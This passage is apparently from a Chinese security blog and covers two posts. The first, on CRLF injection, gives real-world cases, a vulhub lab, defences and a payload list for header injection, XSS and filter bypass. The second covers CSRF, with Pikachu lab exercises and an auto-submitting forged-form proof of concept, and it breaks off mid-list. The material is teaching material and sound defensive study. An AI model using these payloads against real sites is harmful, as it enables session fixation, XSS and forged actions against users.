<figure class="highlight http"><table><tr><td class="code"><pre><span class="line"><span class="keyword">GET</span> <span class="string">/index.php?url=http://baidu.com%0d%0aSet-Cookie:crlf=true</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>wolke.cn</span><br><span class="line"><span class="attribute">Cookie</span><span class="punctuation">: </span>crlf=true; _ga=GA1.1.1945309492.1638725693; _ga_Q0YHC68NHX=GS1.1.1677577526.284.0.1677577526.0.0.0</span><br><span class="line"><span class="attribute">Sec-Ch-Ua</span><span class="punctuation">: </span>&quot;Google Chrome&quot;;v=&quot;111&quot;, &quot;Not(A:Brand&quot;;v=&quot;8&quot;, &quot;Chromium&quot;;v=&quot;111&quot;</span><br><span class="line"><span class="attribute">Sec-Ch-Ua-Mobile</span><span class="punctuation">: </span>?0</span><br><span class="line"><span class="attribute">Sec-Ch-Ua-Platform</span><span class="punctuation">: </span>&quot;Windows&quot;</span><br><span class="line"><span class="attribute">Upgrade-Insecure-Requests</span><span class="punctuation">: </span>1</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Safari/537.36</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7</span><br><span class="line"><span class="attribute">Sec-Fetch-Site</span><span class="punctuation">: </span>none</span><br><span class="line"><span class="attribute">Sec-Fetch-Mode</span><span class="punctuation">: </span>navigate</span><br><span class="line"><span class="attribute">Sec-Fetch-User</span><span class="punctuation">: </span>?1</span><br><span class="line"><span class="attribute">Sec-Fetch-Dest</span><span class="punctuation">: </span>document</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>zh-CN,zh;q=0.9</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br></pre></td></tr></table></figure>

<p>重新请求，抓包，发现Cookie中多了crlf=true。</p>
<p>测试的用例大家可能会觉得这漏洞没什么危害性，但试想一下：利用漏洞，注入一个CRLF控制用户的Cookie，或者注入两个CRLF，控制返回给客户端的主体，该漏洞的危害不亚于XSS。</p>
<h1 id="四、漏洞危害"><a href="#四、漏洞危害" class="headerlink" title="四、漏洞危害"></a>四、漏洞危害</h1><p>根据插入的CRLF的个数不同，可设置任意的响应头，控制响应正文两个主要的利用办法。具体的危害表现在：会话固定、XSS、缓存病毒攻击、日志伪造等等。  </p>
<h2 id="1、会话固定-Session-Fixation"><a href="#1、会话固定-Session-Fixation" class="headerlink" title="1、会话固定(Session Fixation)"></a>1、会话固定(Session Fixation)</h2><p>首先说说什么是会话固定攻击，会话固定攻击（session fixation attack）是利用应用系统在服务器的会话ID固定不变机制，借助他人用相同的会话ID获取认证和授权，然后利用该会话ID劫持他人的会话以成功冒充他人，造成会话固定攻击。</p>
<p>会话固定也是会话劫持的一种类型。会话劫持是攻击者偷走受害者与服务器建立链接的会话，而会话固定是攻击者事先建立一个会话，然后诱使受害者使用此会话进行登录，如图所示。</p>
<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1679842571126-fa07395a-8cd3-42da-a404-225b1d52495e.png" alt="1679842571126-fa07395a-8cd3-42da-a404-225b1d52495e"></p>
<p>一个常见的跳转响应包：</p>
<figure class="highlight http"><table><tr><td class="code"><pre><span class="line"><span class="meta">HTTP/1.1</span> <span class="number">302</span> Moved Temporarily</span><br><span class="line"><span class="attribute">Date</span><span class="punctuation">: </span>Fri,26Jun 2018 17:00:05 GMT</span><br><span class="line"><span class="attribute">Content-type</span><span class="punctuation">: </span>text/html</span><br><span class="line"><span class="attribute">Contet-Length</span><span class="punctuation">: </span>155</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br><span class="line"><span class="attribute">Location</span><span class="punctuation">: </span>http://www.sinay.com.cn</span><br></pre></td></tr></table></figure>

<p>当攻击者利用CRLF字符对响应头中的Location进行如下输入：</p>
<figure class="highlight http"><table><tr><td class="code"><pre><span class="line">%0d%0aSet-Cookie:JSPSESSID%3Dhackingsite</span><br></pre></td></tr></table></figure>

<p>则返回包会变成：</p>
<figure class="highlight http"><table><tr><td class="code"><pre><span class="line"><span class="meta">HTTP/1.1</span> <span class="number">302</span> Moved Temporarily</span><br><span class="line"><span class="attribute">Date</span><span class="punctuation">: </span>Fri,26Jun 2018 17:00:05 GMT</span><br><span class="line"><span class="attribute">Content-type</span><span class="punctuation">: </span>text/html</span><br><span class="line"><span class="attribute">Contet-Length</span><span class="punctuation">: </span>155</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br><span class="line"><span class="attribute">Location</span><span class="punctuation">: </span>http://www.sinay.com.cn</span><br><span class="line"><span class="attribute">Set-Cookie</span><span class="punctuation">: </span>JSPSESSID=hackingsite</span><br></pre></td></tr></table></figure>

<p>攻击者就可以给访问者设置一个session，造成“会话固定”。通过这种攻击方式可以实现插入任意响应Header。</p>
<h2 id="2、反射型XSS"><a href="#2、反射型XSS" class="headerlink" title="2、反射型XSS"></a>2、反射型XSS</h2><p>上述案例，如果我们输入的是：</p>
<figure class="highlight http"><table><tr><td class="code"><pre><span class="line">%0d%0a%0d%0a&lt;img src=1 onerror=alert(/xss/)&gt;</span><br></pre></td></tr></table></figure>

<p>则返回包会变为：</p>
<figure class="highlight http"><table><tr><td class="code"><pre><span class="line"><span class="meta">HTTP/1.1</span> <span class="number">302</span> Moved Temporarily</span><br><span class="line"><span class="attribute">Date</span><span class="punctuation">: </span>Fri,26Jun 2018 17:00:05 GMT</span><br><span class="line"><span class="attribute">Content-type</span><span class="punctuation">: </span>text/html</span><br><span class="line"><span class="attribute">Contet-Length</span><span class="punctuation">: </span>155</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br><span class="line"><span class="attribute">Location</span>:</span><br><span class="line"></span><br><span class="line"><span class="routeros">&lt;img <span class="attribute">src</span>=1 <span class="attribute">onerror</span>=alert(/xss/)&gt;</span></span><br></pre></td></tr></table></figure>

<p>浏览器会根据CRLF将http包分为header和body，然后将body中的内容执行，从而达到XSS。</p>
<p>从上面的案例中，如果遇到XSS过滤的情况我们还可以在httpheader中注入<code>X-XSS-Protection: 0</code>，可绕过浏览器的过滤规则实现XSS弹窗显示。</p>
<h1 id="五、实战案例讲解"><a href="#五、实战案例讲解" class="headerlink" title="五、实战案例讲解"></a>五、实战案例讲解</h1><h2 id="1、Shopify响应拆分"><a href="#1、Shopify响应拆分" class="headerlink" title="1、Shopify响应拆分"></a>1、Shopify响应拆分</h2><p>shopify会在后台中记录用户上次访问的是哪一个商店，然后将其放置在cookie，如访问<code>/last_shop?xxx.shopify.com</code>，则返回<code>set-cookie:xxx.shopify.com</code>，所以输入：</p>
<figure class="highlight http"><table><tr><td class="code"><pre><span class="line">/last_shop?xxx.shopify.com%0d%0aContent-Length:%200%0d%0a%0d%0aHTTP/1.1%20200%20OK%0d%0aContent-Type:%20text/html%0d%0aContent-Length:%2019%0d%0a%0d%0a&lt;html&gt;deface&lt;/html&gt;</span><br></pre></td></tr></table></figure>

<p>最终解析的结果为：</p>
<figure class="highlight http"><table><tr><td class="code"><pre><span class="line"><span class="attribute">Set-cookie</span><span class="punctuation">: </span>xxx.shopify.com</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>0</span><br><span class="line"></span><br><span class="line"><span class="meta">HTTP/1.1</span> <span class="number">200</span> OK</span><br><span class="line">Content-Type:text/html</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>19</span><br><span class="line"></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">html</span>&gt;</span>deface<span class="tag">&lt;/<span class="name">html</span>&gt;</span></span></span><br></pre></td></tr></table></figure>

<h2 id="2、Hackerone响应拆分"><a href="#2、Hackerone响应拆分" class="headerlink" title="2、Hackerone响应拆分"></a>2、Hackerone响应拆分</h2><p>这个案例也是302跳转类型，但略有不同，访问</p>
<figure class="highlight http"><table><tr><td class="code"><pre><span class="line">info.hacker.one/%0d%0a%09headername:%20headervalue</span><br></pre></td></tr></table></figure>

<p>Location正常取值info.hacker.one，剩下的解析为Header头。</p>
<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1679897330095-e2a2611f-9191-46b8-93fb-24484000f97f.png" alt="1679897330095-e2a2611f-9191-46b8-93fb-24484000f97f"></p>
<h2 id="3、Twitter过渡绕过"><a href="#3、Twitter过渡绕过" class="headerlink" title="3、Twitter过渡绕过"></a>3、Twitter过渡绕过</h2><p>用户在访问<a href="https://twitter.com/i/safety/report_story">https://twitter.com/i/safety/report_story</a> 地址时，服务器会获取参数reported_tweet_id的值，并将其设置到cookie中，最后导致了漏洞。</p>
<p>这里Twitter禁止用户提交换行符0x0a（%0a），但通过探测，发现其后端检测逻辑为：如果提交的数据是UTF-8编码过的，则会将其解码，去除无用字符后作为cookie输出，所以如果提交%E5%98%8A，不被拦截且经Unicode解码后变为U+560A，最后取0A，同样输入%E5%98%8D最后变成0D，最终payload为：</p>
<figure class="highlight http"><table><tr><td class="code"><pre><span class="line">reported_tweet_id=%E5%98%8A%E5%98%8DSet-Cookie：%20test</span><br></pre></td></tr></table></figure>

<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1679897422865-6b63e64f-5a36-4c9d-8071-8931b5e92817.png" alt="1679897422865-6b63e64f-5a36-4c9d-8071-8931b5e92817"></p>
<p>探测漏洞存在，可进一步进行利用，输入：</p>
<figure class="highlight http"><table><tr><td class="code"><pre><span class="line">reported_tweet_id=test%E5%98%8A%E5%98%8Dcontent-type:text/html%E5%98%8A%E5%98%8Dlocation:%E5%98%8A%E5%98%8D%E5%98%8A%E5%98%8D%E5%98%BCsvg/onload=alert%28innerHTML%28%29%E5%98%BE</span><br></pre></td></tr></table></figure>

<p>经过服务器处理后返回的数据就会变成下面的html响应的形式：  </p>
<figure class="highlight http"><table><tr><td class="code"><pre><span class="line"><span class="attribute">Set-cookie</span><span class="punctuation">: </span>test</span><br><span class="line"><span class="attribute">content-type</span><span class="punctuation">: </span>text/html</span><br><span class="line"><span class="attribute">location</span>:</span><br><span class="line"></span><br><span class="line">&lt;svg/onload=alert(innerHTML)&gt;</span><br></pre></td></tr></table></figure>

<h2 id="4、WEBrick响应拆分"><a href="#4、WEBrick响应拆分" class="headerlink" title="4、WEBrick响应拆分"></a>4、WEBrick响应拆分</h2><p>补充一例简单的CRLF，取自CVE-2017-17742：WEBrick取get参数author作为cookie输出，访问</p>
<figure class="highlight http"><table><tr><td class="code"><pre><span class="line">localhost:8080/?author=Aaron%0D%0AX-Foo:%20hacked</span><br></pre></td></tr></table></figure>

<p>返回报文：<img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1679897543211-dd571f88-0640-411b-ac83-70a4b79b1505.png" alt="1679897543211-dd571f88-0640-411b-ac83-70a4b79b1505"></p>
<h1 id="六、靶场测试"><a href="#六、靶场测试" class="headerlink" title="六、靶场测试"></a>六、靶场测试</h1><p>利用docker搭建vulhub靶场，进入<code>/vulhub/nginx/insecure-configuration</code>目录 </p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">docker-compose up -d</span><br></pre></td></tr></table></figure>

<p>8080端口是crlf漏洞靶场</p>
<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1679919004548-1978c97e-3d40-4ba9-8447-32d7f3e524fb.png" alt="1679919004548-1978c97e-3d40-4ba9-8447-32d7f3e524fb"></p>
<p>Nginx会将$uri进行解码，导致传入<code>%0a%0d</code>即可引入换行符，造成CRLF注入漏洞。</p>
<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1679918925961-a1beb8f1-0e2a-42bc-a1bb-e354385a1e5d.png" alt="1679918925961-a1beb8f1-0e2a-42bc-a1bb-e354385a1e5d"></p>
<p>错误的配置文件示例（原本的目的是为了让http的请求跳转到https上）：</p>
<figure class="highlight nginx"><table><tr><td class="code"><pre><span class="line"><span class="attribute">location</span> / &#123;</span><br><span class="line">	<span class="attribute">return</span> <span class="number">302</span> https://$host$uri;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h1 id="七、挖掘技巧"><a href="#七、挖掘技巧" class="headerlink" title="七、挖掘技巧"></a>七、挖掘技巧</h1><p>挖掘此类漏洞，依旧要遵循亘古不变的原则，观察我们的输入“输入“和“输出”位置，对于CRLF则是观察返回的各种类型的协议头，所以挖掘分三步：</p>
<ol>
<li>观察输出是否在返回头中，查看输入，可能是在URL值和参数、cookie头中。在过往的挖掘过程中，最常见的两种情况是使用输入参数创建 Cookie和302跳转location处。</li>
<li>提交%0D%0A字符，验证服务器是否响应%0D%0A，若过滤可以通过双重编码绕过。</li>
<li>漏洞利用，使杀伤最大化，将漏洞转化为HTML注入，XSS，缓存等。</li>
</ol>
<h1 id="八、防御手段"><a href="#八、防御手段" class="headerlink" title="八、防御手段"></a>八、防御手段</h1><p>要避免http响应截断，需要注意以下几点：</p>
<ol>
<li> 对用户的数据进行合法性校验，对特殊的字符进行编码，如&lt;、&gt;、’、”、CR、LF等，限制用户输入的CR和LF，或者对CR和LF字符正确编码后再输出，以防止注入自定义HTTP头。 </li>
<li> 创建安全字符白名单，只接受白名单中的字符出现在HTTP响应头文件中。 </li>
<li> 在将数据传送到http响应头之前，删除所有的换行符。 </li>
</ol>
<h1 id="九、CRLF-Payload"><a href="#九、CRLF-Payload" class="headerlink" title="九、CRLF Payload"></a>九、CRLF Payload</h1><figure class="highlight http"><table><tr><td class="code"><pre><span class="line">探测漏洞：</span><br><span class="line">%0d%0aheader:header</span><br><span class="line">%0aheader:header</span><br><span class="line">%0dheader:header</span><br><span class="line">%23%0dheader:header</span><br><span class="line">%3f%0dheader:header</span><br><span class="line">/%250aheader:header</span><br><span class="line">/%250aheader:header</span><br><span class="line">/%%0a0aheader:header</span><br><span class="line">/%3f%0dheader:header</span><br><span class="line">/%23%0dheader:header</span><br><span class="line">/%25%30aheader:header</span><br><span class="line">/%25%30%61header:header</span><br><span class="line">/%u000aheader:header</span><br></pre></td></tr></table></figure>
<figure class="highlight http"><table><tr><td class="code"><pre><span class="line">开放重定向：</span><br><span class="line">/www.google.com/%2f%2e%2e%0d%0aheader:header</span><br></pre></td></tr></table></figure>
<figure class="highlight http"><table><tr><td class="code"><pre><span class="line">CRLF-XSS：</span><br><span class="line">%0d%0aContent-Length:35%0d%0aX-XSS-Protection:0%0d%0a%0d%0a23%0d%0a&lt;svg%20onload=alert(document.domain)&gt;%0d%0a0%0d%0a/%2e%2e</span><br></pre></td></tr></table></figure>
<figure class="highlight http"><table><tr><td class="code"><pre><span class="line">XSS绕过：</span><br><span class="line">%2Fxxx:1%2F%0aX-XSS-Protection:0%0aContent-Type:text/html%0aContent-Length:39%0a%0a%3cscript%3ealert(document.cookie)%3c/</span><br></pre></td></tr></table></figure>
<figure class="highlight http"><table><tr><td class="code"><pre><span class="line">Location：</span><br><span class="line">%0d%0aContent-Type:%20text%2fhtml%0d%0aHTTP%2f1.1%20200%20OK%0d%0aContent-Type:%20text%2fhtml%0d%0a%0d%0a%3Cscript%3Ealert(&#x27;XSS&#x27;);%3C%2fscript%3E</span><br></pre></td></tr></table></figure>

<h1 id="十、参考链接"><a href="#十、参考链接" class="headerlink" title="十、参考链接"></a>十、参考链接</h1><ul>
<li><a href="https://www.cnblogs.com/echojson/p/12805102.html">https://www.cnblogs.com/echojson/p/12805102.html</a></li>
<li><a href="https://www.freebuf.com/column/202762.html">https://www.freebuf.com/column/202762.html</a></li>
<li><a href="https://cloud.tencent.com/developer/article/1516335">https://cloud.tencent.com/developer/article/1516335</a></li>
</ul>
]]></content>
      <categories>
        <category>Web安全</category>
      </categories>
      <tags>
        <tag>Web安全</tag>
      </tags>
  </entry>
  <entry>
    <title>CSRF跨站请求伪造攻击</title>
    <url>/post/ecd34c17.html</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="一、CSRF介绍"><a href="#一、CSRF介绍" class="headerlink" title="一、CSRF介绍"></a>一、CSRF介绍</h1><p>&emsp;&emsp;CSRF全称为跨站请求伪造（Cross-site request forgery），是一种网络攻击方式，也被称为 one-click attack 或者 session riding。通常缩写为CSRF或者XSRF，是一种对网站的恶意利用。尽管听起来像xss漏洞，但是它与xss漏洞非常不同。xss利用站点内的信任用户，而CSRF则通过伪装成受信任用户请求受信任的网站。与xss攻击相比，csrf攻击往往不大流行，也难以防范，所以认为比xss漏洞更具危险性</p>
<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1643616381733-721617c9-d9d6-42c2-ac37-d20efaa0969c.png" alt="img"></p>
<h1 id="二、CSRF漏洞原理"><a href="#二、CSRF漏洞原理" class="headerlink" title="二、CSRF漏洞原理"></a>二、CSRF漏洞原理</h1><p>&emsp;&emsp;CSRF攻击利用网站对于用户网页浏览器的信任，挟持用户当前已登陆的Web应用程序，去执行并非用户本意的操作。CSRF漏洞能够做的事情包括：以目标用户的名义发送邮件、发消息、盗取目标用户的账号，甚至购买商品、虚拟货币转账，这会泄露个人隐私并威胁到了目标用户的财产安全</p>
<p><strong>Csrf漏洞的攻击过程有两个重点：</strong></p>
<ol>
<li>目标用户已经登录了网站，能够执行网站的功能</li>
<li>目标用户访问了攻击者构造的URL</li>
</ol>
<h1 id="三、CSRF攻击实例"><a href="#三、CSRF攻击实例" class="headerlink" title="三、CSRF攻击实例"></a>三、CSRF攻击实例</h1><h2 id="1、角色"><a href="#1、角色" class="headerlink" title="1、角色"></a>1、角色</h2><ul>
<li><p>正常浏览网页的用户：User</p>
</li>
<li><p>正规的但是具有漏洞的网站：WebA</p>
</li>
<li><p>利用CSRF进行攻击的网站：WebB</p>
</li>
</ul>
<h2 id="2、流程"><a href="#2、流程" class="headerlink" title="2、流程"></a>2、流程</h2><h3 id="（1）步骤一"><a href="#（1）步骤一" class="headerlink" title="（1）步骤一"></a>（1）步骤一</h3><p>&emsp;&emsp;用户登录、浏览并信任正规网站WebA，同时，WebA通过用户的验证并在用户的浏览器中产生Cookie。</p>
<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1617437619916-2562f1f0-863e-4310-a1be-11da133cb70b.png" alt="img"></p>
<h3 id="（2）步骤二"><a href="#（2）步骤二" class="headerlink" title="（2）步骤二"></a>（2）步骤二</h3><p>&emsp;&emsp;攻击者WebB通过在WebA中添加图片链接等方式诱导用户User访问网站WebB。</p>
<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1617437657144-879ae8f4-cd63-4c10-b750-d6cfe7020ebb.png" alt="img"></p>
<h3 id="（3）步骤三"><a href="#（3）步骤三" class="headerlink" title="（3）步骤三"></a>（3）步骤三</h3><p>&emsp;&emsp;在用户User被诱导访问WebB后，WebB会利用用户User的浏览器访问第三方网站WebA，并发出操作请求。</p>
<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1617437694596-5072be63-79df-4b6b-813e-cb185c67650f.png" alt="img"></p>
<h3 id="（4）步骤四"><a href="#（4）步骤四" class="headerlink" title="（4）步骤四"></a>（4）步骤四</h3><p>&emsp;&emsp;用户User的浏览器根据WebB的要求，带着步骤一中产生的Cookie访问WebA。</p>
<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1617437722488-02b20440-0d96-4e4b-a613-38cfc8f631a9.png" alt="img"></p>
<h3 id="（5）步骤五"><a href="#（5）步骤五" class="headerlink" title="（5）步骤五"></a>（5）步骤五</h3><p>&emsp;&emsp;网站WebA接收到用户浏览器的请求，WebA无法分辨请求由何处发出，由于浏览器访问时带上用户的Cookie，因此WebA会响应浏览器的请求，如此一来，攻击网站WebB就达到了模拟用户操作的目的。</p>
<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1617437743099-a82443ff-c4fe-4a4e-ad26-33d0d1e422af.png" alt="img"></p>
<h1 id="四、CSRF攻击防护"><a href="#四、CSRF攻击防护" class="headerlink" title="四、CSRF攻击防护"></a>四、CSRF攻击防护</h1><p>&emsp;&emsp;上文简单的叙述了CSRF攻击的原理，接下来将要介绍几种CSRF攻击的防护方法。</p>
<h3 id="（1）验证用户"><a href="#（1）验证用户" class="headerlink" title="（1）验证用户"></a>（1）验证用户</h3><p>&emsp;&emsp;当用户发送重要的请求时需要输入原始密码或验证码</p>
<h3 id="（2）限制请求方式"><a href="#（2）限制请求方式" class="headerlink" title="（2）限制请求方式"></a>（2）限制请求方式</h3><p>&emsp;&emsp;限制请求方式只能为POST</p>
<h3 id="（3）只使用JSON-API"><a href="#（3）只使用JSON-API" class="headerlink" title="（3）只使用JSON API"></a>（3）只使用JSON API</h3><p>&emsp;&emsp;使用JavaScript发起AJAX请求是限制跨域的，并不能通过简单的表单来发送JSON，所以，通过只接收JSON可以很大可能避免CSRF攻击。</p>
<h3 id="（4）验证HTTP-Referer字段（同源策略）"><a href="#（4）验证HTTP-Referer字段（同源策略）" class="headerlink" title="（4）验证HTTP Referer字段（同源策略）"></a>（4）验证HTTP Referer字段（同源策略）</h3><p>&emsp;&emsp;根据 HTTP 协议，在 HTTP 头中有一个字段叫 Referer，它记录了该 HTTP 请求的来源地址。在通常情况下，访问一个安全受限页面的请求来自于同一个网站，比如上文中用户User想要在网站WebA中进行转账操作，那么用户User必须先登录WebA，然后再通过点击页面上的按钮出发转账事件，这时该转帐请求的 Referer值就会是转账按钮所在的页面的URL，而如果黑客要对银行网站实施 CSRF攻击，他只能在他自己的网站构造请求，当用户User通过黑客的网站发送请求到WebA时，该请求的 Referer是指向黑客自己的网站。</p>
<p>&emsp;&emsp;因此，要防御 CSRF 攻击，网站WebA只需要对于每一个转账请求验证其 Referer值，如果是以网站WebA的网址开头的域名，则说明该请求是来自WebA自己的请求，是合法的。如果 Referer是其他网站的话，则有可能是黑客的 CSRF 攻击，拒绝该请求。</p>
<h3 id="（5）在请求地址中添加token验证"><a href="#（5）在请求地址中添加token验证" class="headerlink" title="（5）在请求地址中添加token验证"></a>（5）在请求地址中添加token验证</h3><p>&emsp;&emsp;CSRF 攻击之所以能够成功，是因为黑客可以完全伪造用户的请求，该请求中所有的用户验证信息都是存在于 cookie中，因此黑客可以在不知道这些验证信息的情况下直接利用用户自己的 cookie来通过安全验证。要抵御CSRF，关键在于在请求中放入黑客所不能伪造的信息，并且该信息不存在于 cookie之中。可以在 HTTP  请求中以参数的形式加入一个随机产生的 token，并在服务器端建立一个拦截器来验证这个token，如果请求中没有 token或者 token内容不正确，则认为可能是 CSRF 攻击而拒绝该请求。</p>
<p>&emsp;&emsp;这种方法要比检查 Referer 要安全一些，token 可以在用户登陆后产生并放于session之中，然后在每次请求时把token从session中拿出，与请求中的token进行比对。</p>
<p>&emsp;&emsp;token可看作是数据包的编号，每次产生一个新的请求数据包时，就会有一个新的token，与session中的token比对不成功，即抵御了CSRF攻击</p>
<h1 id="五、Pikachu靶场CSRF练习"><a href="#五、Pikachu靶场CSRF练习" class="headerlink" title="五、Pikachu靶场CSRF练习"></a>五、Pikachu靶场CSRF练习</h1><h2 id="1、CSRF（GET）"><a href="#1、CSRF（GET）" class="headerlink" title="1、CSRF（GET）"></a>1、CSRF（GET）</h2><p>&emsp;&emsp;首先从提示可以使用用户名和密码登录，然后在用户修改个人信息的时候，坏人通过一些方式（ARP欺骗劫持、中间人监听、流量嗅探）抓取到了包</p>
<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1627388148980-928a286c-b8d6-490b-9c1c-112dae10a5d7.png" alt="img"></p>
<p>&emsp;&emsp;得到一个修改电话号码URL：<code>127.0.0.1/pikachu/vul/csrf/csrfget/csrf_get_edit.php?sex=&amp;phonenum=123456789&amp;add=&amp;email=&amp;submit=submit</code>，复制好保留，把包放掉，现在手机号是123456789</p>
<p>&emsp;&emsp;假如想让手机号改为666666，做一个html，其中一条关键语句<code>&lt;a href=&quot;http://127.0.0.1/pikachu/vul/csrf/csrfget/csrf_get_edit.php?sex=&amp;phonenum=666666&amp;add=&amp;email=&amp;submit=submit&quot;&gt;点我抽奖！&lt;/a&gt;</code>，将做好的html发给当事人，当事人点击了链接，即可成功修改电话号码（如果是正经的话得把html放到公网上）</p>
<h2 id="2、CSRF（POST）"><a href="#2、CSRF（POST）" class="headerlink" title="2、CSRF（POST）"></a>2、CSRF（POST）</h2><p>&emsp;&emsp;小白修改信息，点击提交，被黑客抓到了包，记录好</p>
<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1627390103249-ddb81d64-7790-422a-a74e-16c506e1d30a.png" alt="img"></p>
<p>&emsp;&emsp;此时写一个POST传参的html页面，发送给小白，小白点击一闪而过就会被修改信息了（或者用BurpSuite也可以一键生成“engagement tools”-&gt;“generate CSRF poc”）</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="javascript"></span></span><br><span class="line"><span class="javascript">      <span class="built_in">window</span>.onload = <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span></span><br><span class="line"><span class="javascript">        <span class="built_in">document</span>.getElementById(<span class="string">&quot;postsubmit&quot;</span>).click();</span></span><br><span class="line"><span class="javascript">      &#125;</span></span><br><span class="line"><span class="javascript">    </span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">form</span> <span class="attr">method</span>=<span class="string">&quot;post&quot;</span> <span class="attr">action</span>=<span class="string">&quot;http://127.0.0.1/pikachu/vul/csrf/csrfpost/csrf_p ost_edit.php&quot;</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">input</span> <span class="attr">id</span>=<span class="string">&quot;sex&quot;</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span> <span class="attr">name</span>=<span class="string">&quot;sex&quot;</span> <span class="attr">value</span>=<span class="string">&quot;girl&quot;</span> /&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">input</span> <span class="attr">id</span>=<span class="string">&quot;phonenum&quot;</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span> <span class="attr">name</span>=<span class="string">&quot;phonenum&quot;</span> <span class="attr">value</span>=<span class="string">&quot;666666&quot;</span> /&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">input</span> <span class="attr">id</span>=<span class="string">&quot;add&quot;</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span> <span class="attr">name</span>=<span class="string">&quot;add&quot;</span> <span class="attr">value</span>=<span class="string">&quot;china&quot;</span> /&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">input</span> <span class="attr">id</span>=<span class="string">&quot;email&quot;</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span> <span class="attr">name</span>=<span class="string">&quot;email&quot;</span> <span class="attr">value</span>=<span class="string">&quot;vince@pikachu.com&quot;</span> /&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">input</span> <span class="attr">id</span>=<span class="string">&quot;sex&quot;</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span> <span class="attr">name</span>=<span class="string">&quot;sex&quot;</span> <span class="attr">value</span>=<span class="string">&quot;girl&quot;</span> /&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">input</span> <span class="attr">id</span>=<span class="string">&quot;postsubmit&quot;</span> <span class="attr">type</span>=<span class="string">&quot;submit&quot;</span> <span class="attr">name</span>=<span class="string">&quot;submit&quot;</span> <span class="attr">value</span>=<span class="string">&quot;submit&quot;</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>

<h2 id="3、CSRF-Token"><a href="#3、CSRF-Token" class="headerlink" title="3、CSRF Token"></a>3、CSRF Token</h2><p>&emsp;&emsp;由于token值每次提交后都会失效，恶意攻击者抓到小白的GET请求时里面的token已经失效了，所以网站也就没有执行GET请求的操作，CSRF也就防御成功</p>
<h1 id="六、CSRF自动化测试—CSRFTester"><a href="#六、CSRF自动化测试—CSRFTester" class="headerlink" title="六、CSRF自动化测试—CSRFTester"></a>六、CSRF自动化测试—CSRFTester</h1><h2 id="1、CSRFTester简介"><a href="#1、CSRFTester简介" class="headerlink" title="1、CSRFTester简介"></a>1、CSRFTester简介</h2><p>&emsp;&emsp;CSRFTester工具的测试原理大概是这样的，使用代理抓取我们在浏览器中访问过的所有的连接以及所有的表单等信息，通过在CSRFTester中修改相应的表单等信息，重新提交，相当于一次伪造客户端请求，如果测试的请求成功被网站服务器接受，则说明存在CSRF漏洞，当然此款工具也可以被用来进行CSRF攻击。</p>
<h2 id="2、CSRFTester环境准备"><a href="#2、CSRFTester环境准备" class="headerlink" title="2、CSRFTester环境准备"></a>2、CSRFTester环境准备</h2><ul>
<li><p>Windows系统</p>
</li>
